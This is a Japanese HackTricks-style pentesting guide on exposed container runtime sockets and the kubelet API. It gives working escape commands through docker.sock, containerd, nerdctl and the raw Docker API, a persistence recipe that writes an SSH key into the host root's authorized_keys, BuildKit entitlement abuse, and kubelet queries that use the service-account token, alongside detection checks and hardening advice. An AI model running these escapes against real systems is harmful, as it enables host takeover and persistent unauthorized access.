# Runtime API と Daemon の露出

{{#include ../../../banners/hacktricks-training.md}}

## 概要

実際のコンテナ侵害の多くは、namespace escape から始まるわけではありません。runtime control plane へのアクセスから始まります。ワークロードが、マウントされた Unix socket や公開された TCP listener を通じて `dockerd`、`containerd`、CRI-O、Podman、kubelet と通信できる場合、攻撃者はより高い権限を持つ新しいコンテナの作成、ホストの filesystem のマウント、ホスト namespace への参加、または機密性の高いノード情報の取得を要求できる可能性があります。このような場合、runtime API が実質的なセキュリティ境界であり、その侵害はホスト侵害にほぼ等しいものです。

このため、runtime socket の露出は kernel の保護機能とは別に記録する必要があります。通常の seccomp、capabilities、MAC confinement が適用されたコンテナでも、`/var/run/docker.sock` や `/run/containerd/containerd.sock` がコンテナ内にマウントされていれば、API 呼び出しひとつでホストを侵害される可能性があります。現在のコンテナの kernel isolation は設計どおりに機能していても、runtime management plane は完全に露出していることがあります。

## Daemon のアクセスモデル

Docker Engine は従来、ローカルの Unix socket `unix:///var/run/docker.sock` を通じて、特権を持つ API を公開しています。歴史的には、`tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を通じて、リモートにも公開されていました。強力な TLS とクライアント認証なしで daemon をリモートに公開すると、実質的に Docker API がリモートの root インターフェースになります。

containerd、CRI-O、Podman、kubelet も同様に影響の大きい攻撃対象領域を公開しています。名前やワークフローは異なりますが、仕組みは同じです。呼び出し元がワークロードの作成、ホストパスのマウント、認証情報の取得、または実行中のコンテナの変更を行えるインターフェースは、特権を持つ管理用チャネルであり、それに応じて扱う必要があります。

コンテナ管理用の Web UI も、ローカルアカウントに socket への直接アクセスを与えずに、同じ境界を露出させることがあります。たとえば、[Portainer issue #493](https://github.com/portainer/portainer/issues/493) では、旧版の 1.11.1 ビルドにおける認証不要の administrator password reset が報告されています。ローカルからアクセス可能な UI は、調査の手がかりとしてのみ扱ってください。インストール済みビルドと認証動作、実際に administrator 権限を制御できるか、管理対象の endpoint で書き込み可能なホスト bind mount を使ってコンテナを作成できるかを確認してください。[Portainer のドキュメント](https://docs.portainer.io/admin/environments/add/docker/socket)によると、socket を使った管理には Docker socket へのアクセスが必要です。rootless または制限付きの endpoint であれば、ホストへの影響は異なります。プロセス名、ポート、バージョン文字列だけから、認証の欠陥やホスト root へのアクセスを推測しないでください。

確認すべき一般的なローカルパスは次のとおりです。

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

古いスタックや、より特殊なスタックでは、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などのエンドポイントも公開されている場合があります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は、通常のアプリケーション用ソケットではなくランタイム制御用のインターフェースであるため、同様に慎重に扱う必要があります。

## 安全なリモートアクセス

デーモンをローカルソケットの外部に公開する必要がある場合、接続は TLS で保護し、できれば相互認証を使用して、デーモンとクライアントの双方が相手を検証できるようにする必要があります。利便性のために Docker デーモンを平文 HTTP で公開する古い慣習は、コンテナ管理における最も危険な過ちのひとつです。API の機能が強力なため、特権コンテナを直接作成できてしまうからです。

Docker の歴史的な設定パターンは次のようなものでした。

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

systemdベースのホストでは、daemonとの通信が`fd://`として示される場合もあります。これは、daemonが自ら直接bindするのではなく、systemdから事前にopenされたsocketをプロセスが継承することを意味します。重要なのは正確な構文ではなく、セキュリティ上の影響です。daemonが厳格な権限設定のローカルsocket以外でlistenした時点で、transport securityとclient authenticationは任意のhardeningではなく、必須になります。

## 悪用

runtime socketが存在する場合は、それが何か、互換性のあるclientがあるか、raw HTTPまたはgRPCでアクセスできるかを確認します:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

これらのコマンドは、存在しないパス、マウントされているがアクセスできないソケット、稼働中の特権 API を区別するのに役立ちます。クライアントから接続できた場合、次に確認するのは、その API を使ってホストの bind mount またはホストの namespace 共有を指定した新しいコンテナを起動できるかどうかです。

### クライアントがインストールされていない場合

`docker`、`podman` などの使いやすい CLI がないからといって、ソケットが安全だとは限りません。Docker Engine は Unix ソケット上で HTTP を使い、Podman は `podman system service` を通じて Docker 互換 API と Libpod ネイティブ API の両方を公開します。そのため、`curl` だけの最小限の環境でも、デーモンを操作できる可能性があります。

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

これは post-exploitation で重要です。防御側が通常のクライアントバイナリを削除しても、管理用ソケットはマウントされたままの場合があるためです。Podman ホストでは、rootful と rootless のデプロイで重要なパスが異なる点に注意してください。rootful のサービスインスタンスでは `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### 完全な例: Docker Socket から Host Root へ

`docker.sock` にアクセスできる場合、典型的なエスケープ方法は、ホストのルートファイルシステムをマウントする新しいコンテナを起動し、その中で `chroot` することです。

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

これは Docker daemon を介した、ホスト上での root 権限による直接実行を可能にします。影響はファイルの読み取りにとどまりません。新しいコンテナ内に入った攻撃者は、ホスト上のファイルを改変したり、認証情報を収集したり、永続化を仕掛けたり、追加の特権ワークロードを起動したりできます。

### 完全な例: Docker Socket からホストの Namespace へ

攻撃者がファイルシステムのみへのアクセスではなく、namespace への侵入を選ぶ場合:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

この経路では、現在のコンテナを悪用するのではなく、ホストの namespace を明示的に公開して新しいコンテナを作成するよう runtime に要求することで、ホストに到達します。

### Docker Socket Persistence Pattern

runtime の制御は、一度きりの shell ではなく、persistence にも利用できます。一般的なパターンは、ホストのマウントを持つ helper container を作成し、許可されたアクセス情報または起動 hook をマウントされたホストのファイルシステムに書き込み、ホストがそれを取り込むことを検証することです。

例の形式:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

同じ考え方は、オペレーターが何を証明したいかに応じて、systemd units、cron fragments、application startup files、SSH keys を対象にできます。重要なのは、永続的な変更が元のコンテナ内で追加の権限を得て行われるのではなく、runtime daemon のホストレベルの filesystem authority を通じて行われる点です。

### Raw Docker API Helper Pivot

Docker CLI がない場合、同じ host-mount helper flow を Unix socket 経由の HTTP で実行できます。一般的な流れは、API を確認し、ホスト bind mount を使う helper container を作成して起動し、exec instance を作成して起動することです。

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

最終的な `/exec/<id>/start` リクエストは返された exec ID に依存しますが、セキュリティ上の要点は正確な JSON の処理方法とは無関係です。rootful Docker daemon への raw API access があれば、より強力な helper workload を要求できます。

### 全体例: containerd Socket

マウントされた `containerd` socket も、通常は同じくらい危険です:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Dockerに近いクライアントがある場合、`nerdctl` は `ctr` より便利です。`--privileged`、`--pid=host`、`-v` などの使い慣れたフラグを使えるためです。

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

影響は再びホスト侵害です。Docker専用のツールがなくても、別の runtime API が同じ管理者権限を提供している可能性があります。Kubernetes ノードでは、`crictl` が CRI endpoint に直接アクセスするため、偵察やコンテナ操作に使える場合もあります。

### BuildKit ソケット

`buildkitd` は、「単なるビルドバックエンド」と考えられがちなため見落とされやすいものの、この daemon は依然として特権を持つ control plane です。アクセス可能な `buildkitd.sock` があると、攻撃者は任意のビルドステップを実行し、worker の機能を調査し、侵害された環境のローカルコンテキストを利用し、daemon 側で許可されている場合は `network.host` や `security.insecure` などの危険な entitlement を要求できます。

最初に試すとよい操作は次のとおりです。

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

daemon が build requests を受け付ける場合は、insecure entitlements が利用可能かテストします。

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

影響の正確な範囲は daemon の設定によって異なりますが、entitlements が寛容な rootful BuildKit サービスは、無害な開発者向けの利便機能ではありません。特に CI runners や共有ビルドノードでは、価値の高い管理用攻撃対象領域として扱ってください。

### TCP 経由の Kubelet API

kubelet は container runtime ではありませんが、ノード管理プレーンの一部であり、信頼境界の議論でも同じ範囲に含まれることがよくあります。kubelet のセキュアポート `10250` に workload から到達できる場合や、ノードの認証情報、kubeconfigs、またはプロキシ権限が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pod の列挙、ログの取得、ノード上のコンテナ内でのコマンド実行ができる可能性があります。

まずは手軽な調査から始めます。

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

kubelet または API-server proxy path が `exec` を許可している場合、WebSocket 対応クライアントを使って、ノード上の他のコンテナで code execution を実行できます。これが、`nodes/proxy` に `get` 権限しかなくても、見た目以上に危険な理由でもあります。このリクエストは、コマンドを実行する kubelet endpoint に到達する可能性があり、kubelet との直接的なやり取りは通常の Kubernetes audit logs には記録されません。<sup>[[2]](#references)</sup>

## チェック

これらのチェックの目的は、コンテナが、信頼境界の外に置かれているべき管理プレーンに到達できるかどうかを確認することです。

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

ここで注目すべき点:

- マウントされた runtime socket は、単なる情報開示ではなく、通常は直接的な管理権限を与える手段です。
- TLS なしで `2375` をリッスンする TCP listener は、リモート侵害につながる状態として扱うべきです。
- `DOCKER_HOST` などの環境変数から、ワークロードがホストの runtime と通信するよう意図的に設計されていることが分かる場合があります。

## Runtime のデフォルト設定

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトではローカル Unix socket | `dockerd` はローカル socket をリッスンし、daemon は通常 rootful です | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` での TLS の設定が弱い、または未設定 |
| Podman | デフォルトでは daemonless CLI | 通常のローカル利用では、常時稼働する特権 daemon は不要です。`podman system service` が有効な場合、API socket が公開されることはあります | `podman.sock` の公開、service の広範な公開、rootful API の利用 |
| containerd | ローカルの特権 socket | 管理 API はローカル socket 経由で公開され、通常は上位レベルのツールから利用されます | `containerd.sock` のマウント、`ctr` または `nerdctl` への広範なアクセス、特権 namespace の公開 |
| CRI-O | ローカルの特権 socket | CRI endpoint は、ノード内の信頼されたコンポーネントからの利用を想定しています | `crio.sock` のマウント、信頼されていないワークロードへの CRI endpoint の公開 |
| Kubernetes kubelet | ノードローカルの管理 API | kubelet を Pods から広く到達可能にすべきではありません。認証と認可の設定によっては、アクセスにより Pod の状態、認証情報、実行機能が漏れる可能性があります | kubelet の socket や証明書のマウント、kubelet 認証の弱さ、ホストネットワークの利用と到達可能な kubelet endpoint の組み合わせ |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server のバイパスに伴うリスク](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
